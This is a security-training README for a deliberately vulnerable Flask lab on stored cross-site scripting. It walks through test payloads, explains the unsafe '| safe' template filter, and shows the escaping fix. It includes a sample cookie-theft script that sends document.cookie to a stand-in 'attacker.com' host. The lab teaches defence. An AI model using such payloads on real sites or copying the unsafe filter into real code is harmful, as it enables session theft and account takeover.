# Stored XSS (Cross-Site Scripting)

## What is Stored XSS?

Imagine a public notice board where anyone can pin a note. Now imagine someone
pins a note that says "whoever reads this, slap yourself." Stored XSS is exactly
that — an attacker posts a malicious script to a website and it executes
automatically for every single person who visits that page, forever, until it
is removed.

The word "stored" is the key difference here. The malicious script is saved
in the database just like any other normal content. Every visitor triggers it
without doing anything wrong.

---

## How to Run
```
cd vulnerable/xss_stored
python app.py
```

Then open http://127.0.0.1:5003 in your browser.

---

## Trying the Exploit

### Step 1 - Post a normal comment
First post a normal comment to see how the app works:
- Name: `alice`
- Comment: `This is a great website!`

The comment appears on the page as expected.

### Step 2 - Post a malicious script
Now post this as a comment:
```
<script>alert('XSS!')</script>
```

An alert popup appears immediately. Now refresh the page.

The alert fires again. And again every time anyone loads the page.
That script is now stored in the database and will execute for every visitor.

### Step 3 - Try a more realistic attack
Post this as a comment:
```
<script>document.body.style.background='red'</script>
```

The entire page background turns red for every visitor. This is called
page defacement and is used by attackers to embarrass organizations.

---

## Why Does This Work?

Here is the vulnerable part of the template:
```html
<div>{{ comment[2] | safe }}</div>
```

The `| safe` filter in Jinja2 tells Flask "trust this content, render it
as raw HTML." This means anything stored in the database gets rendered
directly as HTML in the browser, including script tags.

The browser has no way of knowing the script came from an attacker. As far
as it is concerned, the script is part of the page and it executes it.

---

## Real World Impact

Stored XSS is particularly dangerous because:

- It does not require the victim to click a malicious link
- It affects every single visitor to the page automatically
- It persists until someone manually removes it from the database
- It can be completely invisible to the victim

In real attacks stored XSS is used to:

- **Steal session cookies** — giving the attacker full account access
- **Keylogging** — recording everything the victim types on the page
- **Phishing** — replacing the login form with a fake one that sends credentials to the attacker
- **Cryptojacking** — using the visitor's browser to mine cryptocurrency silently

A real attack payload for cookie theft would look like this:
```
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

Every visitor's session cookie gets silently sent to the attacker's server.

---

## The Fix - Output Encoding

Compare these two lines in the templates:

Vulnerable `vulnerable/xss_stored/templates/comments.html`:
```html
<div>{{ comment[2] | safe }}</div>
```

Secure `secure/xss_stored/templates/comments.html`:
```html
<div>{{ comment[2] }}</div>
```

Removing the `| safe` filter lets Jinja2 auto-escape the content. This means
`<script>` gets converted to `&lt;script&gt;` before it reaches the browser.
The browser displays it as plain text instead of executing it.

The secure version also escapes input before storing it using Python's
built in `html.escape()`:
```python
username = html.escape(username)
comment = html.escape(comment)
```

This means even if the auto-escaping in the template was somehow bypassed,
the data in the database is already harmless.

---

## Key Takeaway

Never render user generated content as raw HTML. Always let your templating
engine escape output automatically and never use the `| safe` filter on
user controlled data. Treat every piece of user input as potentially malicious.

---

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Stored XSS Labs](https://portswigger.net/web-security/cross-site-scripting/stored)